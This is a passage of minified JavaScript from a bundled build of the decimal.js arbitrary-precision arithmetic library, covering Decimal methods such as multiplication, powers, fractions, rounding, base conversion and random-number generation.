            if (!o && (hk(i, u + 1, 0), i.times(i).eq(s))) {
              r = i;
              break;
            }
            (n += 4), (o = 1);
          }
        return (VA = !0), hk(r, u, l.rounding, t);
      }),
    (ak.tangent = ak.tan =
      function () {
        var t,
          e,
          n = this,
          r = n.constructor;
        return n.isFinite()
          ? n.isZero()
            ? new r(n)
            : ((t = r.precision),
              (e = r.rounding),
              (r.precision = t + 10),
              (r.rounding = 1),
              ((n = n.sin()).s = 1),
              (n = fk(n, new r(1).minus(n.times(n)).sqrt(), t + 10, 0)),
              (r.precision = t),
              (r.rounding = e),
              hk(2 == qA || 4 == qA ? n.neg() : n, t, e, !0))
          : new r(NaN);
      }),
    (ak.times = ak.mul =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a,
          u,
          c,
          l = this,
          d = l.constructor,
          f = l.d,
          h = (t = new d(t)).d;
        if (((t.s *= l.s), !(f && f[0] && h && h[0])))
          return new d(
            !t.s || (f && !f[0] && !h) || (h && !h[0] && !f)
              ? NaN
              : f && h
              ? 0 * t.s
              : t.s / 0
          );
        for (
          n = QA(l.e / 7) + QA(t.e / 7),
            (u = f.length) < (c = h.length) &&
              ((i = f), (f = h), (h = i), (s = u), (u = c), (c = s)),
            i = [],
            r = s = u + c;
          r--;

        )
          i.push(0);
        for (r = c; --r >= 0; ) {
          for (e = 0, o = u + r; o > r; )
            (a = i[o] + h[r] * f[o - r - 1] + e),
              (i[o--] = a % ok | 0),
              (e = (a / ok) | 0);
          i[o] = (i[o] + e) % ok | 0;
        }
        for (; !i[--s]; ) i.pop();
        return (
          e ? ++n : i.shift(),
          (t.d = i),
          (t.e = mk(i, n)),
          VA ? hk(t, d.precision, d.rounding) : t
        );
      }),
    (ak.toBinary = function (t, e) {
      return xk(this, 2, t, e);
    }),
    (ak.toDecimalPlaces = ak.toDP =
      function (t, e) {
        var n = this,
          r = n.constructor;
        return (
          (n = new r(n)),
          void 0 === t
            ? n
            : (ck(t, 0, KA),
              void 0 === e ? (e = r.rounding) : ck(e, 0, 8),
              hk(n, t + n.e + 1, e))
        );
      }),
    (ak.toExponential = function (t, e) {
      var n,
        r = this,
        o = r.constructor;
      return (
        void 0 === t
          ? (n = pk(r, !0))
          : (ck(t, 0, KA),
            void 0 === e ? (e = o.rounding) : ck(e, 0, 8),
            (n = pk((r = hk(new o(r), t + 1, e)), !0, t + 1))),
        r.isNeg() && !r.isZero() ? "-" + n : n
      );
    }),
    (ak.toFixed = function (t, e) {
      var n,
        r,
        o = this,
        i = o.constructor;
      return (
        void 0 === t
          ? (n = pk(o))
          : (ck(t, 0, KA),
            void 0 === e ? (e = i.rounding) : ck(e, 0, 8),
            (n = pk((r = hk(new i(o), t + o.e + 1, e)), !1, t + r.e + 1))),
        o.isNeg() && !o.isZero() ? "-" + n : n
      );
    }),
    (ak.toFraction = function (t) {
      var e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h = this,
        p = h.d,
        m = h.constructor;
      if (!p) return new m(h);
      if (
        ((c = n = new m(1)),
        (r = u = new m(0)),
        (s = (i = (e = new m(r)).e = wk(p) - h.e - 1) % 7),
        (e.d[0] = $A(10, s < 0 ? 7 + s : s)),
        null == t)
      )
        t = i > 0 ? e : c;
      else {
        if (!(a = new m(t)).isInt() || a.lt(c)) throw Error(ZA + a);
        t = a.gt(e) ? (i > 0 ? e : c) : a;
      }
      for (
        VA = !1,
          a = new m(uk(p)),
          l = m.precision,
          m.precision = i = 7 * p.length * 2;
        (d = fk(a, e, 0, 1, 1)), 1 != (o = n.plus(d.times(r))).cmp(t);

      )
        (n = r),
          (r = o),
          (o = c),
          (c = u.plus(d.times(o))),
          (u = o),
          (o = e),
          (e = a.minus(d.times(o))),
          (a = o);
      return (
        (o = fk(t.minus(n), r, 0, 1, 1)),
        (u = u.plus(o.times(c))),
        (n = n.plus(o.times(r))),
        (u.s = c.s = h.s),
        (f =
          fk(c, r, i, 1).minus(h).abs().cmp(fk(u, n, i, 1).minus(h).abs()) < 1
            ? [c, r]
            : [u, n]),
        (m.precision = l),
        (VA = !0),
        f
      );
    }),
    (ak.toHexadecimal = ak.toHex =
      function (t, e) {
        return xk(this, 16, t, e);
      }),
    (ak.toNearest = function (t, e) {
      var n = this,
        r = n.constructor;
      if (((n = new r(n)), null == t)) {
        if (!n.d) return n;
        (t = new r(1)), (e = r.rounding);
      } else {
        if (
          ((t = new r(t)), void 0 === e ? (e = r.rounding) : ck(e, 0, 8), !n.d)
        )
          return t.s ? n : t;
        if (!t.d) return t.s && (t.s = n.s), t;
      }
      return (
        t.d[0]
          ? ((VA = !1), (n = fk(n, t, 0, e, 1).times(t)), (VA = !0), hk(n))
          : ((t.s = n.s), (n = t)),
        n
      );
    }),
    (ak.toNumber = function () {
      return +this;
    }),
    (ak.toOctal = function (t, e) {
      return xk(this, 8, t, e);
    }),
    (ak.toPower = ak.pow =
      function (t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a = this,
          u = a.constructor,
          c = +(t = new u(t));
        if (!(a.d && t.d && a.d[0] && t.d[0])) return new u($A(+a, c));
        if ((a = new u(a)).eq(1)) return a;
        if (((r = u.precision), (i = u.rounding), t.eq(1))) return hk(a, r, i);
        if (
          (e = QA(t.e / 7)) >= t.d.length - 1 &&
          (n = c < 0 ? -c : c) <= 9007199254740991
        )
          return (o = vk(u, a, n, r)), t.s < 0 ? new u(1).div(o) : hk(o, r, i);
        if ((s = a.s) < 0) {
          if (e < t.d.length - 1) return new u(NaN);
          if (
            (!(1 & t.d[e]) && (s = 1),
            0 == a.e && 1 == a.d[0] && 1 == a.d.length)
          )
            return (a.s = s), a;
        }
        return (e =
          0 != (n = $A(+a, c)) && isFinite(n)
            ? new u(n + "").e
            : QA(c * (Math.log("0." + uk(a.d)) / Math.LN10 + a.e + 1))) >
          u.maxE + 1 || e < u.minE - 1
          ? new u(e > 0 ? s / 0 : 0)
          : ((VA = !1),
            (u.rounding = a.s = 1),
            (n = Math.min(12, (e + "").length)),
            (o = Ik(t.times(Sk(a, r + n)), r)).d &&
              lk((o = hk(o, r + 5, 1)).d, r, i) &&
              ((e = r + 10),
              +uk((o = hk(Ik(t.times(Sk(a, e + n)), e), e + 5, 1)).d).slice(
                r + 1,
                r + 15
              ) +
                1 ==
                1e14 && (o = hk(o, r + 1, 0))),
            (o.s = s),
            (VA = !0),
            (u.rounding = i),
            hk(o, r, i));
      }),
    (ak.toPrecision = function (t, e) {
      var n,
        r = this,
        o = r.constructor;
      return (
        void 0 === t
          ? (n = pk(r, r.e <= o.toExpNeg || r.e >= o.toExpPos))
          : (ck(t, 1, KA),
            void 0 === e ? (e = o.rounding) : ck(e, 0, 8),
            (n = pk(
              (r = hk(new o(r), t, e)),
              t <= r.e || r.e <= o.toExpNeg,
              t
            ))),
        r.isNeg() && !r.isZero() ? "-" + n : n
      );
    }),
    (ak.toSignificantDigits = ak.toSD =
      function (t, e) {
        var n = this.constructor;
        return (
          void 0 === t
            ? ((t = n.precision), (e = n.rounding))
            : (ck(t, 1, KA), void 0 === e ? (e = n.rounding) : ck(e, 0, 8)),
          hk(new n(this), t, e)
        );
      }),
    (ak.toString = function () {
      var t = this,
        e = t.constructor,
        n = pk(t, t.e <= e.toExpNeg || t.e >= e.toExpPos);
      return t.isNeg() && !t.isZero() ? "-" + n : n;
    }),
    (ak.truncated = ak.trunc =
      function () {
        return hk(new this.constructor(this), this.e + 1, 1);
      }),
    (ak.valueOf = ak.toJSON =
      function () {
        var t = this,
          e = t.constructor,
          n = pk(t, t.e <= e.toExpNeg || t.e >= e.toExpPos);
        return t.isNeg() ? "-" + n : n;
      });
  var fk = (function () {
    function t(t, e, n) {
      var r,
        o = 0,
        i = t.length;
      for (t = t.slice(); i--; )
        (r = t[i] * e + o), (t[i] = r % n | 0), (o = (r / n) | 0);
      return o && t.unshift(o), t;
    }
    function e(t, e, n, r) {
      var o, i;
      if (n != r) i = n > r ? 1 : -1;
      else
        for (o = i = 0; o < n; o++)
          if (t[o] != e[o]) {
            i = t[o] > e[o] ? 1 : -1;
            break;
          }
      return i;
    }
    function n(t, e, n, r) {
      for (var o = 0; n--; )
        (t[n] -= o), (o = t[n] < e[n] ? 1 : 0), (t[n] = o * r + t[n] - e[n]);
      for (; !t[0] && t.length > 1; ) t.shift();
    }
    return function (r, o, i, s, a, u) {
      var c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S,
        _,
        T,
        B,
        C,
        E = r.constructor,
        x = r.s == o.s ? 1 : -1,
        P = r.d,
        O = o.d;
      if (!(P && P[0] && O && O[0]))
        return new E(
          r.s && o.s && (P ? !O || P[0] != O[0] : O)
            ? (P && 0 == P[0]) || !O
              ? 0 * x
              : x / 0
            : NaN
        );
      for (
        u
          ? ((h = 1), (l = r.e - o.e))
          : ((u = ok), (h = 7), (l = QA(r.e / h) - QA(o.e / h))),
          B = O.length,
          _ = P.length,
          w = (y = new E(x)).d = [],
          d = 0;
        O[d] == (P[d] || 0);
        d++
      );
      if (
        (O[d] > (P[d] || 0) && l--,
        null == i
          ? ((k = i = E.precision), (s = E.rounding))
          : (k = a ? i + (r.e - o.e) + 1 : i),
        k < 0)
      )
        w.push(1), (p = !0);
      else {
        if (((k = (k / h + 2) | 0), (d = 0), 1 == B)) {
          for (f = 0, O = O[0], k++; (d < _ || f) && k--; d++)
            (I = f * u + (P[d] || 0)), (w[d] = (I / O) | 0), (f = I % O | 0);
          p = f || d < _;
        } else {
          for (
            (f = (u / (O[0] + 1)) | 0) > 1 &&
              ((O = t(O, f, u)),
              (P = t(P, f, u)),
              (B = O.length),
              (_ = P.length)),
              S = B,
              v = (b = P.slice(0, B)).length;
            v < B;

          )
            b[v++] = 0;
          (C = O.slice()).unshift(0), (T = O[0]), O[1] >= u / 2 && ++T;
          do {
            (f = 0),
              (c = e(O, b, B, v)) < 0
                ? ((A = b[0]),
                  B != v && (A = A * u + (b[1] || 0)),
                  (f = (A / T) | 0) > 1
                    ? (f >= u && (f = u - 1),
                      1 ==
                        (c = e(
                          (m = t(O, f, u)),
                          b,
                          (g = m.length),
                          (v = b.length)
                        )) && (f--, n(m, B < g ? C : O, g, u)))
                    : (0 == f && (c = f = 1), (m = O.slice())),
                  (g = m.length) < v && m.unshift(0),
                  n(b, m, v, u),
                  -1 == c &&
                    (c = e(O, b, B, (v = b.length))) < 1 &&
                    (f++, n(b, B < v ? C : O, v, u)),
                  (v = b.length))
                : 0 === c && (f++, (b = [0])),
              (w[d++] = f),
              c && b[0] ? (b[v++] = P[S] || 0) : ((b = [P[S]]), (v = 1));
          } while ((S++ < _ || void 0 !== b[0]) && k--);
          p = void 0 !== b[0];
        }
        w[0] || w.shift();
      }
      if (1 == h) (y.e = l), (UA = p);
      else {
        for (d = 1, f = w[0]; f >= 10; f /= 10) d++;
        (y.e = d + l * h - 1), hk(y, a ? i + y.e + 1 : i, s, p);
      }
      return y;
    };
  })();
  function hk(t, e, n, r) {
    var o,
      i,
      s,
      a,
      u,
      c,
      l,
      d,
      f,
      h = t.constructor;
    t: if (null != e) {
      if (!(d = t.d)) return t;
      for (o = 1, a = d[0]; a >= 10; a /= 10) o++;
      if ((i = e - o) < 0)
        (i += 7),
          (s = e),
          (u = ((l = d[(f = 0)]) / $A(10, o - s - 1)) % 10 | 0);
      else if ((f = Math.ceil((i + 1) / 7)) >= (a = d.length)) {
        if (!r) break t;
        for (; a++ <= f; ) d.push(0);
        (l = u = 0), (o = 1), (s = (i %= 7) - 7 + 1);
      } else {
        for (l = a = d[f], o = 1; a >= 10; a /= 10) o++;
        u = (s = (i %= 7) - 7 + o) < 0 ? 0 : (l / $A(10, o - s - 1)) % 10 | 0;
      }
      if (
        ((r =
          r ||
          e < 0 ||
          void 0 !== d[f + 1] ||
          (s < 0 ? l : l % $A(10, o - s - 1))),
        (c =
          n < 4
            ? (u || r) && (0 == n || n == (t.s < 0 ? 3 : 2))
            : u > 5 ||
              (5 == u &&
                (4 == n ||
                  r ||
                  (6 == n &&
                    (i > 0 ? (s > 0 ? l / $A(10, o - s) : 0) : d[f - 1]) % 10 &
                      1) ||
                  n == (t.s < 0 ? 8 : 7)))),
        e < 1 || !d[0])
      )
        return (
          (d.length = 0),
          c
            ? ((e -= t.e + 1),
              (d[0] = $A(10, (7 - (e % 7)) % 7)),
              (t.e = -e || 0))
            : (d[0] = t.e = 0),
          t
        );
      if (
        (0 == i
          ? ((d.length = f), (a = 1), f--)
          : ((d.length = f + 1),
            (a = $A(10, 7 - i)),
            (d[f] = s > 0 ? ((l / $A(10, o - s)) % $A(10, s) | 0) * a : 0)),
        c)
      )
        for (;;) {
          if (0 == f) {
            for (i = 1, s = d[0]; s >= 10; s /= 10) i++;
            for (s = d[0] += a, a = 1; s >= 10; s /= 10) a++;
            i != a && (t.e++, d[0] == ok && (d[0] = 1));
            break;
          }
          if (((d[f] += a), d[f] != ok)) break;
          (d[f--] = 0), (a = 1);
        }
      for (i = d.length; 0 === d[--i]; ) d.pop();
    }
    return (
      VA &&
        (t.e > h.maxE
          ? ((t.d = null), (t.e = NaN))
          : t.e < h.minE && ((t.e = 0), (t.d = [0]))),
      t
    );
  }
  function pk(t, e, n) {
    if (!t.isFinite()) return _k(t);
    var r,
      o = t.e,
      i = uk(t.d),
      s = i.length;
    return (
      e
        ? (n && (r = n - s) > 0
            ? (i = i.charAt(0) + "." + i.slice(1) + bk(r))
            : s > 1 && (i = i.charAt(0) + "." + i.slice(1)),
          (i = i + (t.e < 0 ? "e" : "e+") + t.e))
        : o < 0
        ? ((i = "0." + bk(-o - 1) + i), n && (r = n - s) > 0 && (i += bk(r)))
        : o >= s
        ? ((i += bk(o + 1 - s)),
          n && (r = n - o - 1) > 0 && (i = i + "." + bk(r)))
        : ((r = o + 1) < s && (i = i.slice(0, r) + "." + i.slice(r)),
          n && (r = n - s) > 0 && (o + 1 === s && (i += "."), (i += bk(r)))),
      i
    );
  }
  function mk(t, e) {
    var n = t[0];
    for (e *= 7; n >= 10; n /= 10) e++;
    return e;
  }
  function gk(t, e, n) {
    if (e > ik) throw ((VA = !0), n && (t.precision = n), Error(XA));
    return hk(new t(FA), e, 1, !0);
  }
  function yk(t, e, n) {
    if (e > sk) throw Error(XA);
    return hk(new t(jA), e, n, !0);
  }
  function wk(t) {
    var e = t.length - 1,
      n = 7 * e + 1;
    if ((e = t[e])) {
      for (; e % 10 == 0; e /= 10) n--;
      for (e = t[0]; e >= 10; e /= 10) n++;
    }
    return n;
  }
  function bk(t) {
    for (var e = ""; t--; ) e += "0";
    return e;
  }
  function vk(t, e, n, r) {
    var o,
      i = new t(1),
      s = Math.ceil(r / 7 + 4);
    for (VA = !1; ; ) {
      if (
        (n % 2 && Pk((i = i.times(e)).d, s) && (o = !0), 0 === (n = QA(n / 2)))
      ) {
        (n = i.d.length - 1), o && 0 === i.d[n] && ++i.d[n];
        break;
      }
      Pk((e = e.times(e)).d, s);
    }
    return (VA = !0), i;
  }
  function Ak(t) {
    return 1 & t.d[t.d.length - 1];
  }
  function kk(t, e, n) {
    for (var r, o = new t(e[0]), i = 0; ++i < e.length; ) {
      if (!(r = new t(e[i])).s) {
        o = r;
        break;
      }
      o[n](r) && (o = r);
    }
    return o;
  }
  function Ik(t, e) {
    var n,
      r,
      o,
      i,
      s,
      a,
      u,
      c = 0,
      l = 0,
      d = 0,
      f = t.constructor,
      h = f.rounding,
      p = f.precision;
    if (!t.d || !t.d[0] || t.e > 17)
      return new f(
        t.d
          ? t.d[0]
            ? t.s < 0
              ? 0
              : 1 / 0
            : 1
          : t.s
          ? t.s < 0
            ? 0
            : t
          : NaN
      );
    for (
      null == e ? ((VA = !1), (u = p)) : (u = e), a = new f(0.03125);
      t.e > -2;

    )
      (t = t.times(a)), (d += 5);
    for (
      u += r = ((Math.log($A(2, d)) / Math.LN10) * 2 + 5) | 0,
        n = i = s = new f(1),
        f.precision = u;
      ;

    ) {
      if (
        ((i = hk(i.times(t), u, 1)),
        (n = n.times(++l)),
        uk((a = s.plus(fk(i, n, u, 1))).d).slice(0, u) === uk(s.d).slice(0, u))
      ) {
        for (o = d; o--; ) s = hk(s.times(s), u, 1);
        if (null != e) return (f.precision = p), s;
        if (!(c < 3 && lk(s.d, u - r, h, c)))
          return hk(s, (f.precision = p), h, (VA = !0));
        (f.precision = u += 10), (n = i = a = new f(1)), (l = 0), c++;
      }
      s = a;
    }
  }
  function Sk(t, e) {
    var n,
      r,
      o,
      i,
      s,
      a,
      u,
      c,
      l,
      d,
      f,
      h = 1,
      p = t,
      m = p.d,
      g = p.constructor,
      y = g.rounding,
      w = g.precision;
    if (p.s < 0 || !m || !m[0] || (!p.e && 1 == m[0] && 1 == m.length))
      return new g(m && !m[0] ? -1 / 0 : 1 != p.s ? NaN : m ? 0 : p);
    if (
      (null == e ? ((VA = !1), (l = w)) : (l = e),
      (g.precision = l += 10),
      (r = (n = uk(m)).charAt(0)),
      !(Math.abs((i = p.e)) < 15e14))
    )
      return (
        (c = gk(g, l + 2, w).times(i + "")),
        (p = Sk(new g(r + "." + n.slice(1)), l - 10).plus(c)),
        (g.precision = w),
        null == e ? hk(p, w, y, (VA = !0)) : p
      );
    for (; (r < 7 && 1 != r) || (1 == r && n.charAt(1) > 3); )
      (r = (n = uk((p = p.times(t)).d)).charAt(0)), h++;
    for (
      i = p.e,
        r > 1
          ? ((p = new g("0." + n)), i++)
          : (p = new g(r + "." + n.slice(1))),
        d = p,
        u = s = p = fk(p.minus(1), p.plus(1), l, 1),
        f = hk(p.times(p), l, 1),
        o = 3;
      ;

    ) {
      if (
        ((s = hk(s.times(f), l, 1)),
        uk((c = u.plus(fk(s, new g(o), l, 1))).d).slice(0, l) ===
          uk(u.d).slice(0, l))
      ) {
        if (
          ((u = u.times(2)),
          0 !== i && (u = u.plus(gk(g, l + 2, w).times(i + ""))),
          (u = fk(u, new g(h), l, 1)),
          null != e)
        )
          return (g.precision = w), u;
        if (!lk(u.d, l - 10, y, a))
          return hk(u, (g.precision = w), y, (VA = !0));
        (g.precision = l += 10),
          (c = s = p = fk(d.minus(1), d.plus(1), l, 1)),
          (f = hk(p.times(p), l, 1)),
          (o = a = 1);
      }
      (u = c), (o += 2);
    }
  }
  function _k(t) {
    return String((t.s * t.s) / 0);
  }
  function Tk(t, e) {
    var n, r, o;
    for (
      (n = e.indexOf(".")) > -1 && (e = e.replace(".", "")),
        (r = e.search(/e/i)) > 0
          ? (n < 0 && (n = r), (n += +e.slice(r + 1)), (e = e.substring(0, r)))
          : n < 0 && (n = e.length),
        r = 0;
      48 === e.charCodeAt(r);
      r++
    );
    for (o = e.length; 48 === e.charCodeAt(o - 1); --o);
    if ((e = e.slice(r, o))) {
      if (
        ((o -= r),
        (t.e = n = n - r - 1),
        (t.d = []),
        (r = (n + 1) % 7),
        n < 0 && (r += 7),
        r < o)
      ) {
        for (r && t.d.push(+e.slice(0, r)), o -= 7; r < o; )
          t.d.push(+e.slice(r, (r += 7)));
        r = 7 - (e = e.slice(r)).length;
      } else r -= o;
      for (; r--; ) e += "0";
      t.d.push(+e),
        VA &&
          (t.e > t.constructor.maxE
            ? ((t.d = null), (t.e = NaN))
            : t.e < t.constructor.minE && ((t.e = 0), (t.d = [0])));
    } else (t.e = 0), (t.d = [0]);
    return t;
  }
  function Bk(t, e, n, r, o) {
    var i,
      s,
      a,
      u,
      c = t.precision,
      l = Math.ceil(c / 7);
    for (VA = !1, u = n.times(n), a = new t(r); ; ) {
      if (
        ((s = fk(a.times(u), new t(e++ * e++), c, 1)),
        (a = o ? r.plus(s) : r.minus(s)),
        (r = fk(s.times(u), new t(e++ * e++), c, 1)),
        void 0 !== (s = a.plus(r)).d[l])
      ) {
        for (i = l; s.d[i] === a.d[i] && i--; );
        if (-1 == i) break;
      }
      (i = a), (a = r), (r = s), (s = i);
    }
    return (VA = !0), (s.d.length = l + 1), s;
  }
  function Ck(t, e) {
    for (var n = t; --e; ) n *= t;
    return n;
  }
  function Ek(t, e) {
    var n,
      r = e.s < 0,
      o = yk(t, t.precision, 1),
      i = o.times(0.5);
    if ((e = e.abs()).lte(i)) return (qA = r ? 4 : 1), e;
    if ((n = e.divToInt(o)).isZero()) qA = r ? 3 : 2;
    else {
      if ((e = e.minus(n.times(o))).lte(i))
        return (qA = Ak(n) ? (r ? 2 : 3) : r ? 4 : 1), e;
      qA = Ak(n) ? (r ? 1 : 4) : r ? 3 : 2;
    }
    return e.minus(o).abs();
  }
  function xk(t, e, n, r) {
    var o,
      i,
      s,
      a,
      u,
      c,
      l,
      d,
      f,
      h = t.constructor,
      p = void 0 !== n;
    if (
      (p
        ? (ck(n, 1, KA), void 0 === r ? (r = h.rounding) : ck(r, 0, 8))
        : ((n = h.precision), (r = h.rounding)),
      t.isFinite())
    ) {
      for (
        p
          ? ((o = 2), 16 == e ? (n = 4 * n - 3) : 8 == e && (n = 3 * n - 2))
          : (o = e),
          (s = (l = pk(t)).indexOf(".")) >= 0 &&
            ((l = l.replace(".", "")),
            ((f = new h(1)).e = l.length - s),
            (f.d = dk(pk(f), 10, o)),
            (f.e = f.d.length)),
          i = u = (d = dk(l, 10, o)).length;
        0 == d[--u];

      )
        d.pop();
      if (d[0]) {
        if (
          (s < 0
            ? i--
            : (((t = new h(t)).d = d),
              (t.e = i),
              (d = (t = fk(t, f, n, r, 0, o)).d),
              (i = t.e),
              (c = UA)),
          (s = d[n]),
          (a = o / 2),
          (c = c || void 0 !== d[n + 1]),
          (c =
            r < 4
              ? (void 0 !== s || c) && (0 === r || r === (t.s < 0 ? 3 : 2))
              : s > a ||
                (s === a &&
                  (4 === r ||
                    c ||
                    (6 === r && 1 & d[n - 1]) ||
                    r === (t.s < 0 ? 8 : 7)))),
          (d.length = n),
          c)
        )
          for (; ++d[--n] > o - 1; ) (d[n] = 0), n || (++i, d.unshift(1));
        for (u = d.length; !d[u - 1]; --u);
        for (s = 0, l = ""; s < u; s++) l += WA.charAt(d[s]);
        if (p) {
          if (u > 1)
            if (16 == e || 8 == e) {
              for (s = 16 == e ? 4 : 3, --u; u % s; u++) l += "0";
              for (u = (d = dk(l, o, e)).length; !d[u - 1]; --u);
              for (s = 1, l = "1."; s < u; s++) l += WA.charAt(d[s]);
            } else l = l.charAt(0) + "." + l.slice(1);
          l = l + (i < 0 ? "p" : "p+") + i;
        } else if (i < 0) {
          for (; ++i; ) l = "0" + l;
          l = "0." + l;
        } else if (++i > u) for (i -= u; i--; ) l += "0";
        else i < u && (l = l.slice(0, i) + "." + l.slice(i));
      } else l = p ? "0p+0" : "0";
      l = (16 == e ? "0x" : 2 == e ? "0b" : 8 == e ? "0o" : "") + l;
    } else l = _k(t);
    return t.s < 0 ? "-" + l : l;
  }
  function Pk(t, e) {
    if (t.length > e) return (t.length = e), !0;
  }
  function Ok(t) {
    return new this(t).abs();
  }
  function Rk(t) {
    return new this(t).acos();
  }
  function Mk(t) {
    return new this(t).acosh();
  }
  function Lk(t, e) {
    return new this(t).plus(e);
  }
  function Nk(t) {
    return new this(t).asin();
  }
  function Dk(t) {
    return new this(t).asinh();
  }
  function Uk(t) {
    return new this(t).atan();
  }
  function qk(t) {
    return new this(t).atanh();
  }
  function zk(t, e) {
    (t = new this(t)), (e = new this(e));
    var n,
      r = this.precision,
      o = this.rounding,
      i = r + 4;
    return (
      t.s && e.s
        ? t.d || e.d
          ? !e.d || t.isZero()
            ? ((n = e.s < 0 ? yk(this, r, o) : new this(0)).s = t.s)
            : !t.d || e.isZero()
            ? ((n = yk(this, i, 1).times(0.5)).s = t.s)
            : e.s < 0
            ? ((this.precision = i),
              (this.rounding = 1),
              (n = this.atan(fk(t, e, i, 1))),
              (e = yk(this, i, 1)),
              (this.precision = r),
              (this.rounding = o),
              (n = t.s < 0 ? n.minus(e) : n.plus(e)))
            : (n = this.atan(fk(t, e, i, 1)))
          : ((n = yk(this, i, 1).times(e.s > 0 ? 0.25 : 0.75)).s = t.s)
        : (n = new this(NaN)),
      n
    );
  }
  function Kk(t) {
    return new this(t).cbrt();
  }
  function Wk(t) {
    return hk((t = new this(t)), t.e + 1, 2);
  }
  function Fk(t, e, n) {
    return new this(t).clamp(e, n);
  }
  function jk(t) {
    if (!t || "object" != typeof t) throw Error(HA + "Object expected");
    var e,
      n,
      r,
      o = !0 === t.defaults,
      i = [
        "precision",
        1,
        KA,
        "rounding",
        0,
        8,
        "toExpNeg",
        -zA,
        0,
        "toExpPos",
        0,
        zA,
        "maxE",
        0,
        zA,
        "minE",
        -zA,
        0,
        "modulo",
        0,
        9,
      ];
    for (e = 0; e < i.length; e += 3)
      if (((n = i[e]), o && (this[n] = GA[n]), void 0 !== (r = t[n]))) {
        if (!(QA(r) === r && r >= i[e + 1] && r <= i[e + 2]))
          throw Error(ZA + n + ": " + r);
        this[n] = r;
      }
    if (((n = "crypto"), o && (this[n] = GA[n]), void 0 !== (r = t[n]))) {
      if (!0 !== r && !1 !== r && 0 !== r && 1 !== r)
        throw Error(ZA + n + ": " + r);
      if (r) {
        if (
          !(
            typeof crypto < "u" &&
            crypto &&
            (crypto.getRandomValues || crypto.randomBytes)
          )
        )
          throw Error(JA);
        this[n] = !0;
      } else this[n] = !1;
    }
    return this;
  }
  function Gk(t) {
    return new this(t).cos();
  }
  function Vk(t) {
    return new this(t).cosh();
  }
  function Hk(t, e) {
    return new this(t).div(e);
  }
  function Zk(t) {
    return new this(t).exp();
  }
  function Xk(t) {
    return hk((t = new this(t)), t.e + 1, 3);
  }
  function Jk() {
    var t,
      e,
      n = new this(0);
    for (VA = !1, t = 0; t < arguments.length; )
      if ((e = new this(arguments[t++])).d) n.d && (n = n.plus(e.times(e)));
      else {
        if (e.s) return (VA = !0), new this(1 / 0);
        n = e;
      }
    return (VA = !0), n.sqrt();
  }
  function Yk(t) {
    return t instanceof wI || (t && t.toStringTag === YA) || !1;
  }
  function Qk(t) {
    return new this(t).ln();
  }
  function $k(t, e) {
    return new this(t).log(e);
  }
  function tI(t) {
    return new this(t).log(2);
  }
  function eI(t) {
    return new this(t).log(10);
  }
  function nI() {
    return kk(this, arguments, "lt");
  }
  function rI() {
    return kk(this, arguments, "gt");
  }
  function oI(t, e) {
    return new this(t).mod(e);
  }
  function iI(t, e) {
    return new this(t).mul(e);
  }
  function sI(t, e) {
    return new this(t).pow(e);
  }
  function aI(t) {
    var e,
      n,
      r,
      o,
      i = 0,
      s = new this(1),
      a = [];
    if (
      (void 0 === t ? (t = this.precision) : ck(t, 1, KA),
      (r = Math.ceil(t / 7)),
      this.crypto)
    )
      if (crypto.getRandomValues)
        for (e = crypto.getRandomValues(new Uint32Array(r)); i < r; )
          (o = e[i]) >= 429e7
            ? (e[i] = crypto.getRandomValues(new Uint32Array(1))[0])
            : (a[i++] = o % 1e7);
      else {
        if (!crypto.randomBytes) throw Error(JA);
        for (e = crypto.randomBytes((r *= 4)); i < r; )
          (o =
            e[i] +
            (e[i + 1] << 8) +
            (e[i + 2] << 16) +
            ((127 & e[i + 3]) << 24)) >= 214e7
            ? crypto.randomBytes(4).copy(e, i)
            : (a.push(o % 1e7), (i += 4));
        i = r / 4;
      }
    else for (; i < r; ) a[i++] = (1e7 * Math.random()) | 0;
    for (
      t %= 7,
        (r = a[--i]) && t && ((o = $A(10, 7 - t)), (a[i] = ((r / o) | 0) * o));
      0 === a[i];
      i--
    )
      a.pop();
    if (i < 0) (n = 0), (a = [0]);
    else {
      for (n = -1; 0 === a[0]; n -= 7) a.shift();
      for (r = 1, o = a[0]; o >= 10; o /= 10) r++;
      r < 7 && (n -= 7 - r);
    }
    return (s.e = n), (s.d = a), s;
  }
  function uI(t) {
    return hk((t = new this(t)), t.e + 1, this.rounding);
  }
  function cI(t) {
    return (t = new this(t)).d ? (t.d[0] ? t.s : 0 * t.s) : t.s || NaN;
  }
  function lI(t) {
    return new this(t).sin();
  }
  function dI(t) {
    return new this(t).sinh();
  }
  function fI(t) {
    return new this(t).sqrt();
  }
  function hI(t, e) {
    return new this(t).sub(e);
  }
  function pI() {
    var t = 0,
      e = arguments,
      n = new this(e[t]);
    for (VA = !1; n.s && ++t < e.length; ) n = n.plus(e[t]);
    return (VA = !0), hk(n, this.precision, this.rounding);
  }
  function mI(t) {
    return new this(t).tan();
  }
  function gI(t) {
    return new this(t).tanh();
  }
  function yI(t) {
    return hk((t = new this(t)), t.e + 1, 1);
  }
  (ak[Symbol.for("nodejs.util.inspect.custom")] = ak.toString),
    (ak[Symbol.toStringTag] = "Decimal");
  var wI = (ak.constructor = (function t(e) {
    var n, r, o;
    function i(t) {
      var e,
        n,
        r,
        o = this;
      if (!(o instanceof i)) return new i(t);
      if (((o.constructor = i), Yk(t)))
        return (
          (o.s = t.s),
          VA
            ? !t.d || t.e > i.maxE
              ? ((o.e = NaN), (o.d = null))
              : t.e < i.minE
              ? ((o.e = 0), (o.d = [0]))
              : ((o.e = t.e), (o.d = t.d.slice()))
            : ((o.e = t.e), (o.d = t.d ? t.d.slice() : t.d)),
          void 0
        );
      if ("number" === (r = typeof t)) {
        if (0 === t)
          return (o.s = 1 / t < 0 ? -1 : 1), (o.e = 0), (o.d = [0]), void 0;
        if (
          (t < 0 ? ((t = -t), (o.s = -1)) : (o.s = 1), t === ~~t && t < 1e7)
        ) {
          for (e = 0, n = t; n >= 10; n /= 10) e++;
          return (
            VA
              ? e > i.maxE
                ? ((o.e = NaN), (o.d = null))
                : e < i.minE
                ? ((o.e = 0), (o.d = [0]))
                : ((o.e = e), (o.d = [t]))
              : ((o.e = e), (o.d = [t])),
            void 0
          );
        }
        return 0 * t != 0
          ? (t || (o.s = NaN), (o.e = NaN), (o.d = null), void 0)
          : Tk(o, t.toString());
